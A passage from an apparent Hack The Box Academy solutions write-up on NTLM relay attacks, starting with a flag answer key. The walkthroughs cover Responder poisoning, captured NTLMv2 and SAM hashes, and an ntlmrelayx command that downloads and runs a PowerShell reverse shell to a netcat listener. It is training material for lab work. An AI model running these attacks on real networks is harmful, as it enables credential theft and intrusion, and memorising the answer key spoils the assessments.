| Section | Question Number | Answer |
| --- | --- | --- |
| The NTLM Authentication Protocol | Question 1 | nonces |
| The NTLM Authentication Protocol | Question 2 | NETLOGON\_NETWORK\_INFO |
| The NTLM Authentication Protocol | Question 3 | NEGOTIATE\_MESSAGE |
| The NTLM Authentication Protocol | Question 4 | Confidentiality |
| The NTLM Authentication Protocol | Question 5 | Not Required |
| The NTLM Relay Attack | Question 1 | WORKSTATION01 |
| The NTLM Relay Attack | Question 2 | dperez |
| The NTLM Relay Attack | Question 3 | 172.16.117.60 |
| NTLM Relay over SMB Attacks | Question 1 | e4737f338324305993ed52f775a6d54d |
| NTLM Relay over SMB Attacks | Question 2 | NTLMRelayx1$Fun |
| NTLMRelayx Use Cases | Question 1 | You\_C4n\_Rel4Y\_NoN\_Admin\_Account$ |
| NTLMRelayx Use Cases | Question 2 | S0c4T\_AnD\_ProxyChains\_R0cks |
| NTLM Cross-protocol Relay Attacks | Question 1 | SMTP\_PlainText\_Creds |
| NTLM Cross-protocol Relay Attacks | Question 2 | prototypeproject |
| NTLM Cross-protocol Relay Attacks | Question 3 | 914b011029e6b43cf188d435951831bd |
| NTLM Cross-protocol Relay Attacks | Question 4 | Relaying\_2\_D4t@Bases\_1S\_Cool |
| Farming Hashes | Question 1 | cmatos |
| Authentication Coercion | Question 1 | \\PIPE\\lsarpc |
| Authentication Coercion | Question 2 | EfsRpcDecryptFileSrv |
| Advanced NTLM Relay Attacks Targeting Kerberos | Question 1 | 172.16.117.60 |
| Advanced NTLM Relay Attacks Targeting Kerberos | Question 2 | RBCD\_Using\_NTLMRelay |
| Advanced NTLM Relay Attacks Targeting Kerberos | Question 3 | Shadow\_Cr3dent1als\_4ttcks |
| Advanced NTLM Relay Attacks Targeting AD CS | Question 1 | Abusing\_ADCS\_For\_FUN |
| Skills Assessment | Question 1 | mozhar |
| Skills Assessment | Question 2 | ADCS\_Coercing\_Authentication |
| Skills Assessment | Question 3 | Here1S@notherPassword! |
| Skills Assessment | Question 4 | Pwn\_DC\_Made\_3@Sy\_With0uT\_S1gning |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# The NTLM Authentication Protocol

## Question 1

### "What does NTLM use to protect against replaying attacks?"

`NTLM` uses nonces, pseudo-random numbers generated for one-time use as a defensive mechanism against replaying attacks.

![[HTB Solutions/CAPE/z. images/958ac3cb431c096bc196dce5a537696f_MD5.jpg]]

Answer: `nonces`

# The NTLM Authentication Protocol

## Question 2

### "What is the name of the data structure that is sent when the server invokes NetrLogonSamLogonWithFlags?"

Once it receives the `AUTHENTICATION_MESSAGE`, and because it does not possess the client's secret key, the server delegates the verification of the user's identity to a DC (a procedure known as Pass-through authentication) by invoking `NetrLogonSamLogonWithFlags`, which contains `NETLOGON_NETWORK_INFO`.

![[HTB Solutions/CAPE/z. images/91e092913393623462fca036fcdf1a03_MD5.jpg]]

Answer: `NETLOGON_NETWORK_INFO`

# The NTLM Authentication Protocol

## Question 3

### "Which NTLM message does the client send to a server to indicate it wants to authenticate and specify its NTLM options?"

The `NEGOTIATE_MESSAGE` is the first `NTLM`\-specific message, sent by the client indicating that it wants to authenticate to the server and specifying its supported/requested `NTLM` options.

![[HTB Solutions/CAPE/z. images/0e77b1f3045f9289e76aa5be32489fe2_MD5.jpg]]

Answer: `NEGOTIATE_MESSAGE`

# The NTLM Authentication Protocol

## Question 4

### "If message signing provides integrity, what does message sealing provide?"

`Message sealing` provides message confidentiality by implementing a symmetric-key encryption mechanism.

![[HTB Solutions/CAPE/z. images/8ae7e91e8362ad2b46da050f247b91fa_MD5.jpg]]

Answer: `sealing`

# The NTLM Authentication Protocol

## Question 5

### "What is the default signing setting for SMB2 clients and servers?"

![[HTB Solutions/CAPE/z. images/d315fe97ae89ef01c1f8985479acdf15_MD5.jpg]]

Answer: `Not Required`

# The NTLM Relay Attack

## Question 1

### "Using Responder in Analyze mode, what is the hostname that 172.16.117.50, requests via NBT-NS or LLMR"

After spawning the target machine, students will connect via SSH with the provided credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
ssh htb-student@STMIP
```

```
┌─[eu-academy-1]─[10.10.14.196]─[htb-ac-8414@htb-7admwdxcua]─[~]
└──╼ [★]$ ssh htb-student@10.129.100.121
The authenticity of host '10.129.100.121 (10.129.100.121)' can't be established.
ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.100.121' (ECDSA) to the list of known hosts.
htb-student@10.129.100.121's password: HTB_@cademy_stdnt!
<SNIP>
  
Last login: Wed Aug 30 16:24:31 2023 from 10.10.14.33 
htb-student@ubuntu:~$
```

Subsequently, students need to start `Responder.py` using `sudo` located in the `tools/Responder` directory in analyze mode by specifying the `-A` parameter and the `-I` parameter followed by the interface `ens192`.

Code: shell

```shell
cd tools/Responder
sudo python3 Responder.py -A -I ens192
```

```
htb-student@ubuntu:~$ cd tools/Responder
htb-student@ubuntu:~/tools/Responder$ sudo python3 Responder.py -A -I ens192
[sudo] password for htb-student: HTB_@cademy_stdnt!
 
<SNIP>

[+] Poisoners:
    LLMNR                      [OFF]
    NBT-NS                     [OFF]
    MDNS                       [OFF]
    DNS                        [ON]
    DHCP                       [OFF]

<SNIP>

[+] Generic Options:
    Responder NIC              [ens192]
    Responder IP               [172.16.117.30]
    Responder IPv6             [fe80::250:56ff:feb9:80f3]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-N5HWJETYO9T]
    Responder Domain Name      [84BV.LOCAL]
Responder DCE-RPC Port     [49310]

[+] Listening for events...

<SNIP>
```

Once the students have started the tool in analyze mode, they will start capturing the broadcasted traffic without interacting (poisoning) with it. After a while, students will find out that the traffic responsible for `172.16.117.50` is coming from `WORKSTATION01`.

```
<SNIP>
[Analyze mode: ICMP] You can ICMP Redirect on this network.
[Analyze mode: ICMP] This workstation (172.16.117.30) is not on the same subnet than the DNS server (127.0.0.53).
[Analyze mode: ICMP] Use \`python tools/Icmp-Redirect.py\` for more details.
[!] Error starting TCP server on port 3389, check permissions or other servers running.
[+] Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned.
[Analyze mode: NBT-NS] Request by 172.16.117.50 for WORKSTATION01, ignoring
<SNIP>
```

Answer: `WORKSTATION01`

# The NTLM Relay Attack

## Question 2

### "Using Responder with poisoning enabled, submit the NTLMv2-SSP Username (without the domain) of the authentication request to the poisoned response sent to 172.16.117.50"

Using the previously established SSH session, students need to start `Responder.py` using `sudo` located in the `tools/Responder` directory in "poisoning" mode by only specifying the `-I` parameter for the interface (`ens192`), configuring the tool to poison every broadcast request/traffic.

Code: shell

```shell
cd tools/Responder
sudo python3 Responder.py -I ens192
```

```
htb-student@ubuntu:~/tools/Responder$ sudo python3 Responder.py -I ens192
<SNIP>

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

<SNIP>

[+] Generic Options:
    Responder NIC              [ens192]
    Responder IP               [172.16.117.30]
    Responder IPv6             [fe80::250:56ff:feb9:80f3]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-6Y3FH7UTIW2]
    Responder Domain Name      [0RAB.LOCAL]
    Responder DCE-RPC Port     [45567]

[+] Listening for events...
```

Right after the students have started the tool in poisoning mode, after a while they will notice a poisoned request (answer) containing the client, username, and the NTLMv2 hash of the user.

```
<SNIP>

[+] Listening for events...
[!] Error starting TCP server on port 3389, check permissions or other servers running.
[*] [NBT-NS] Poisoned answer sent to 172.16.117.60 for name TEXT (service: Workstation/Redirector)
[*] [MDNS] Poisoned answer sent to 172.16.117.60   for name text.local
[*] [LLMNR]  Poisoned answer sent to 172.16.117.60 for name text
[*] [MDNS] Poisoned answer sent to fe80::d36:c954:2211:fa44 for name text.local
[*] [LLMNR]  Poisoned answer sent to fe80::d36:c954:2211:fa44 for name text
[*] [MDNS] Poisoned answer sent to 172.16.117.60   for name text.local
[*] [LLMNR]  Poisoned answer sent to fe80::d36:c954:2211:fa44 for name text
[*] [MDNS] Poisoned answer sent to fe80::d36:c954:2211:fa44 for name text.local
[*] [LLMNR]  Poisoned answer sent to 172.16.117.60 for name text
[*] [MDNS] Poisoned answer sent to 172.16.117.50   for name workstation01.local
[*] [LLMNR]  Poisoned answer sent to 172.16.117.50 for name workstation01
[*] [MDNS] Poisoned answer sent to 172.16.117.50   for name workstation01.local
[*] [LLMNR]  Poisoned answer sent to 172.16.117.50 for name workstation01
[HTTP] NTLMv2 Client   : 172.16.117.50
[HTTP] NTLMv2 Username : INLANEFREIGHT\dperez
[HTTP] NTLMv2 Hash     : 
dperez::INLANEFREIGHT:ae476fbd51fbb39b:D1FA9B611C917C93BAD998F398265396:010100000000000000B2F6EEC0DFD9019B5AE90F32930E1C0000000002000800300052004100420001001E00570049004E002D003600590033004600480037005500540049005700320004003400570049004E002D00360059003300460048003700550054004900570032002E0030005200410042002E004C004F00430041004C000300140030005200410042002E004C004F00430041004C000500140030005200410042002E004C004F00430041004C000700080000B2F6EEC0DFD90106000400020000000800300030000000000000000000000000200000CDF3D160A6ED16FB2F0C701FEA63971673FF704884F42FDE7590C50EEDAC02CB0A001000000000000000000000000000000000000900240063006900660073002F0077006F0072006B00730074006100740069006F006E00300031000000000000000000
```

From the above output, students will come to know the NTLM Authentication was initiated by the user `dperez`.

Additionally, students can look at the logs generated by `Responder` located in `tools/Responder/logs` where they can see all the poisoned traffic and captured credentials.

Answer: `dperez`

# The NTLM Relay Attack

## Question 3

### "Use RunFinger.py to enumerate the 172.16.117.0/24 network. What is the IP address of the server running the MSSQL service?"

Using the previously established SSH session, students need to change their current working directory to `tools/Responder/tools`. There, they will use `RunFinger.py`, which will be used to enumerate the `172.16.117.0/24` subnet. They will have to specify the subnet range using the `-i` parameter.

Code: shell

```shell
cd tools/Responder/tools
python3 RunFinger.py -i 172.16.117.0/24
```

```
htb-student@ubuntu:~$ cd tools/Responder/tools
htb-student@ubuntu:~/tools/Responder/tools$ python3 RunFinger.py -i 172.16.117.0/24

[SMB2]:['172.16.117.3', Os:'Windows 10/Server 2016/2019 (check build)', Build:'17763', Domain:'INLANEFREIGHT', Bootime: 'Unknown', Signing:'True', RDP:'True', SMB1:'False', MSSQL:'False']
[SMB2]:['172.16.117.50', Os:'Windows 10/Server 2016/2019 (check build)', Build:'17763', Domain:'INLANEFREIGHT', Bootime: 'Unknown', Signing:'False', RDP:'True', SMB1:'False', MSSQL:'False']
[SMB2]:['172.16.117.60', Os:'Windows 10/Server 2016/2019 (check build)', Build:'17763', Domain:'INLANEFREIGHT', Bootime: 'Unknown', Signing:'False', RDP:'True', SMB1:'False', MSSQL:'True']
```

Students will come to know that the `MSSQL` service is enabled on `172.16.117.60`.

Answer: `172.16.117.60`

# NTLM Relay over SMB Attacks

## Question 1

### "Relay NTLM authentication over SMB to perform a SAM dump on the relay targets. Submit the NT hash of the local account 'localws01'."

After spawning the target machine, students will connect via SSH with the provided credentials `htb-student:HTB_@cademy_stdnt!`. Students will have to note that they will need to either establish two SSH connections to the spawned target machine, use `tmux`, or connect to the target via `RDP`. This is due to the fact that they will utilize `Responder` and `ntlmrelayx`, and since those tools take over the stdin while they are running.

Code: shell

```shell
ssh htb-student@STMIP
```

```
┌─[eu-academy-1]─[10.10.14.196]─[htb-ac-8414@htb-7admwdxcua]─[~]
└──╼ [★]$ ssh htb-student@10.129.100.121
The authenticity of host '10.129.100.121 (10.129.100.121)' can't be established.
ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.100.121' (ECDSA) to the list of known hosts.
htb-student@10.129.100.121's password: HTB_@cademy_stdnt!
<SNIP>
  
Last login: Wed Aug 30 16:24:31 2023 from 10.10.14.33 
htb-student@ubuntu:~$
```

Subsequently, students need to change their working directory to `tools/Responder`. They will have to turn off the SMB Server, usually started by `Responder` by altering the configuration in the `Responder.conf` file located in the directory. This is done to allow the relayed authentication to go to `ntlmrelayx`:

Code: shell

```shell
cd tools/Responder
sed -i "s/SMB = On/SMB = Off/" Responder.conf
cat Responder.conf | grep -i smb
```

```
htb-student@ubuntu:~$ cd tools/Responder
htb-student@ubuntu:~/tools/Responder$ sed -i "s/SMB = On/SMB = Off/" Responder.conf

htb-student@ubuntu:~/tools/Responder$ cat Responder.conf | grep -i smb
SMB = Off
```

Once students have altered and verified the configuration, they will have to generate a target file of computers with SMB signing `disabled` (False). Utilizing `crackmapexec` and its `--gen-relay-list` parameter, students can generate a file containing the targets over the SMB protocol:

Code: shell

```shell
crackmapexec smb 172.16.117.0/24 --gen-relay-list targets.txt
```

```
htb-student@ubuntu:~/tools/Responder$ crackmapexec smb 172.16.117.0/24 --gen-relay-list targets.txt

SMB         172.16.117.3    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.117.50   445    WS01             [*] Windows 10.0 Build 17763 x64 (name:WS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.117.60   445    SQL01            [*] Windows 10.0 Build 17763 x64 (name:SQL01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
Running CME against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

htb-student@ubuntu:~/tools/Responder$ cat targets.txt 
172.16.117.50
172.16.117.60
```

After generating the file containing the targets, students will have to start `Responder.py` using `sudo` in one terminal window with poisoning enabled and by specifying the interface `ens192` within the `-I` parameter.

Code: shell

```shell
sudo python3 Responder.py -I ens192
```

```
htb-student@ubuntu:~/tools/Responder$ sudo python3 Responder.py -I ens192
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [OFF]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
<SNIP>  
```

Subsequently, students will start `ntlmrelayx` using `sudo` in the other terminal window or by switching to the `root` user using `sudo su`. They will utilize `ntlmrelayx` to dump the SAM database. Subsequently, they will have to specify the `-tf` (TargetFile) parameter with the `targets.txt` containing the computers that they can relay the authentication to. Also, students need to use `-smb2support` parameter that provides `SMBv2` support for hosts that require it.

Code: shell

```shell
sudo ntlmrelayx.py -tf ./targets.txt -smb2support
```

```
htb-student@ubuntu:~/tools/Responder$ sudo ntlmrelayx.py -tf ./targets.txt -smb2support

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server
<SNIP>
```

Subsequently, after students have started both of the tools, after a while, they will notice a request(s) being relayed to `ntlmrelayx.py` and further actions executed by the tool, such as a SAM dump containing the hashes of the users on the respective machine, containing the hash of `localws01`. Students will notice that one of the relayed authentications is a local administrator on one of the machines. With that kind of privilege, students were able to dump the SAM database.

```
<SNIP>
[*] SMBD-Thread-19: Connection from INLANEFREIGHT/PETER@172.16.117.3 controlled, attacking target smb://172.16.117.60
[*] SMBD-Thread-18: Connection from INLANEFREIGHT/RMONTY@172.16.117.3 controlled, but there are no more targets left!
[*] Target system bootKey: 0x563136fa4deefac97a5b7f87dca64ffa
[-] DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdb28300fbd0a0ae2ea455e9e391330b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077aee1958e7f78070:::
localws01:1002:aad3b435b51404eeaad3b435b51404ee:e4737f338324305993ed52f775a6d54d:::
[*] Done dumping SAM hashes for host: 172.16.117.50
<SNIP>
```

Answer: `e4737f338324305993ed52f775a6d54d`

# NTLM Relay over SMB Attacks

## Question 2

### "Relay NTLM authentication over SMB to gain remote code execution on 172.16.117.50. Submit the contents of the file 'C:\\Windows\\System32\\flag.txt'."

After spawning the target machine, students will connect via SSH with the provided credentials `htb-student:HTB_@cademy_stdnt!`. Students will have to note that they will need to either establish four SSH connections to the spawned target machine, use `tmux`, or connect to the target via `RDP`. This is due to the fact that they will utilize two tools `Responder` , `ntlmrelayx` , `python`, and `nc`, and those tools take over the stdin while they are running.

Code: shell

```shell
ssh htb-student@STMIP
```

```
┌─[eu-academy-1]─[10.10.14.196]─[htb-ac-8414@htb-7admwdxcua]─[~]
└──╼ [★]$ ssh htb-student@10.129.100.121
The authenticity of host '10.129.100.121 (10.129.100.121)' can't be established.
ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.100.121' (ECDSA) to the list of known hosts.
htb-student@10.129.100.121's password: HTB_@cademy_stdnt!
<SNIP>
  
Last login: Wed Aug 30 16:24:31 2023 from 10.10.14.33 
htb-student@ubuntu:~$
```

Subsequently, students need to change their working directory to `tools/Responder`. They will have to turn off the SMB Server, usually started by `Responder` by altering the configuration in the `Responder.conf` file located in the directory. This is done to allow the relayed authentication to go to `ntlmrelayx`:

Code: shell

```shell
cd tools/Responder
sed -i "s/SMB = On/SMB = Off/" Responder.conf
cat Responder.conf | grep -i smb
```

```
htb-student@ubuntu:~$ cd tools/Responder
htb-student@ubuntu:~/tools/Responder$ sed -i "s/SMB = On/SMB = Off/" Responder.conf

htb-student@ubuntu:~/tools/Responder$ cat Responder.conf | grep -i smb
SMB = Off
```

Once students have altered and verified the configuration, they will have to generate a target file of computers with SMB signing `disabled` (False). Utilizing `crackmapexec` and its `--gen-relay-list` parameter, students can generate a file containing the targets over the SMB protocol:

Code: shell

```shell
crackmapexec smb 172.16.117.0/24 --gen-relay-list targets.txt
```

```
htb-student@ubuntu:~/tools/Responder$ crackmapexec smb 172.16.117.0/24 --gen-relay-list targets.txt

SMB         172.16.117.3    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.117.50   445    WS01             [*] Windows 10.0 Build 17763 x64 (name:WS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.117.60   445    SQL01            [*] Windows 10.0 Build 17763 x64 (name:SQL01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
Running CME against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

Subsequently, students need to have another established SSH session onto the spawned target, as they will have to utilize `ntlmrelayx` with the `--command/-c` option specifying a PowerShell command to download the reverse shell module (`Invoke-PowerShellTcp.ps1`) located at `tools/` directory, and by combining the command that starts/sends the reverse shell to the specified port in our listener (`nc`).

They will have to start a Python HTTP server by utilizing Python's `http.server` module on port 8000.

Code: shell

```shell
cd tools/
python3 -m http.server 8000
```

```
htb-student@ubuntu:~$ cd tools/
htb-student@ubuntu:~/tools$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Additionally, students will have to start the netcat (`nc`) listener in another terminal window.

Code: shell

```shell
nc -nvlp STMPO
```

```
htb-student@ubuntu:~$ nc -nvlp 7331

Listening on 0.0.0.0 7331
```

Once students have started the Python HTTP server, and the netcat listener, they will have to navigate to `tools/Responder` and start `Responder.py` using `sudo` to poison requests/traffic by specifying the interface (`ens192`) using the `-I` option:

Code: shell

```shell
cd tools/Responder
sudo python3 Responder.py -I ens192
```

Code: session

```
htb-student@ubuntu:~$ cd tools/Responder
htb-student@ubuntu:~/tools/Responder$ sudo python3 Responder.py -I ens192
[sudo] password for htb-student: HTB_@cademy_stdnt!
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [OFF]
    Kerberos server            [ON]
<SNIP>
```

Students will start `ntlmrelayx.py` with the `-tf` option followed by the `targets.txt` file located in the `tools/Responder` directory, and the `-smb2support` option providing `SMBv2` support for hosts that are requiring it, and the `-c` for the command that will be executed on the host that the authentication has been relayed to as long as the user has access in it.

Code: shell

```shell
cd tools/Responder
sudo ntlmrelayx.py -tf ./targets.txt -smb2support -c "powershell -c IEX(New-Object NET.WebClient).DownloadString('http://172.16.117.30:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 172.16.117.30 -Port PWNPO"
```

```
htb-student@ubuntu:~$ cd tools/Responder
htb-student@ubuntu:~/tools/Responder$ sudo ntlmrelayx.py -tf ./targets.txt -smb2support -c "powershell -c IEX(New-Object NET.WebClient).DownloadString('http://172.16.117.30:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 172.16.117.30 -Port 7331"
[sudo] password for htb-student: HTB_@cademy_stdnt!
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server

[*] Setting up RAW Server on port 6666
[*] Servers started, waiting for connections
<SNIP>
```

Once the students have executed the steps of starting a Python HTTP server, having a netcat listener, having Responder to poison requests, and ntlmrelayx specifying the command to download and start the reverse shell, they will come to know that one of the authentications that got relayed managed to provide a reverse shell.

Code: shell

```shell
type flag.txt
```

```
PS C:\Windows\system32>type flag.txt
NTLMRelayx1$Fun
```

Answer: `NTLMRelayx1$Fun`

# NTLMRelayx Use Cases

## Question 1

### "Use impacket's SOCKS server to hold RMONTY's relayed connections and abuse them to find an accessible shared folder on one of the relay targets; once connected to it, submit the contents of the file 'connections.txt'."

After spawning the target machine, students will connect via SSH with the provided credentials `htb-student:HTB_@cademy_stdnt!`. Students will have to note that they will need to either establish three SSH connections to the spawned target machine, use `tmux`, or connect to the target via `RDP`. This is because they will utilize `Responder` , `ntlmrelayx` , and `smbclient.py`/`smbexec.py`, and those tools take over the stdin while they are running.

Code: shell

```shell
ssh htb-student@STMIP
```

```
┌─[eu-academy-1]─[10.10.14.196]─[htb-ac-8414@htb-7admwdxcua]─[~]
└──╼ [★]$ ssh htb-student@10.129.100.121
The authenticity of host '10.129.100.121 (10.129.100.121)' can't be established.
ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.100.121' (ECDSA) to the list of known hosts.
htb-student@10.129.100.121's password: HTB_@cademy_stdnt!
<SNIP>
  
Last login: Wed Aug 30 16:24:31 2023 from 10.10.14.33 
htb-student@ubuntu:~$
```

Subsequently, students need to change their working directory to `tools/Responder`. They will have to turn off the SMB Server, usually started by `Responder`, by altering the configuration in the `Responder.conf` file located in the same directory. This is done to allow the relayed authentication to go to `ntlmrelayx`.

Code: shell

```shell
cd tools/Responder
sed -i "s/SMB = On/SMB = Off/" Responder.conf
cat Responder.conf | grep -i smb
```

```
htb-student@ubuntu:~$ cd tools/Responder/
htb-student@ubuntu:~/tools/Responder$ sed -i "s/SMB = On/SMB = Off/" Responder.conf

htb-student@ubuntu:~/tools/Responder$ cat Responder.conf | grep -i smb
SMB = Off
```

Once students have altered and verified the configuration, they will have to generate a target file of computers that have SMB signing `disabled` (False) in the other SSH shell session. Utilizing `crackmapexec` and its `--gen-relay-list` parameter, students can generate a file containing the targets over the SMB protocol:

Code: shell

```shell
crackmapexec smb 172.16.117.0/24 --gen-relay-list targets.txt
```

```
htb-student@ubuntu:~$ crackmapexec smb 172.16.117.0/24 --gen-relay-list targets.txt

SMB         172.16.117.3    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.117.50   445    WS01             [*] Windows 10.0 Build 17763 x64 (name:WS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.117.60   445    SQL01            [*] Windows 10.0 Build 17763 x64 (name:SQL01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
Running CME against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

Right after, students will have to start `Responder.py` using `sudo` in a poisoning mode, and also specify the interface (`ens192`) using the `-I` parameter.

Code: shell

```shell
sudo python3 Responder.py -I ens192
```

```
htb-student@ubuntu:~/tools/Responder$ sudo python3 Responder.py -I ens192
<SNIP>

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [OFF]
<SNIP>

[+] Generic Options:
    Responder NIC              [ens192]
    Responder IP               [172.16.117.30]
    Responder IPv6             [fe80::250:56ff:feb9:2cd0]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-ZZO9ZW7YCP0]
    Responder Domain Name      [ZN1D.LOCAL]
    Responder DCE-RPC Port     [47374]

[+] Listening for events...

[!] Error starting TCP server on port 3389, check permissions or other servers running.
[*] [NBT-NS] Poisoned answer sent to 172.16.117.50 for name WORKSTATION01 (service: File Server)
[*] [MDNS] Poisoned answer sent to 172.16.117.50   for name workstation01.local
[*] [LLMNR]  Poisoned answer sent to 172.16.117.50 for name workstation01
[*] [MDNS] Poisoned answer sent to 172.16.117.50   for name workstation01.local
[*] [LLMNR]  Poisoned answer sent to 172.16.117.50 for name workstation01
[*] [MDNS] Poisoned answer sent to 172.16.117.3    for name filesharetest.local
[*] [LLMNR]  Poisoned answer sent to fe80::7994:b602:3dc:4970 for name filesharetest
[*] [MDNS] Poisoned answer sent to fe80::7994:b602:3dc:4970 for name filesharetest.local
```

Subsequently, students need to start `ntlmrelayx` using `sudo` in the other terminal window. The tool has to be started by the students utilizing the `-tf` (TargetFile) option and specifying the target file (`targets.txt`), `-smb2support` option providing `SMBv2` support for hosts that require it, and the `-socks` option which starts a SOCKS proxy while holding the relayed authentication and keeping it active, providing the capability of abuse using different tools.

Code: shell

```shell
sudo ntlmrelayx.py -tf ./targets.txt -smb2support -socks
```

```
htb-student@ubuntu:~$ sudo ntlmrelayx.py -tf ./targets.txt -smb2support -socks
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client DCSYNC loaded..
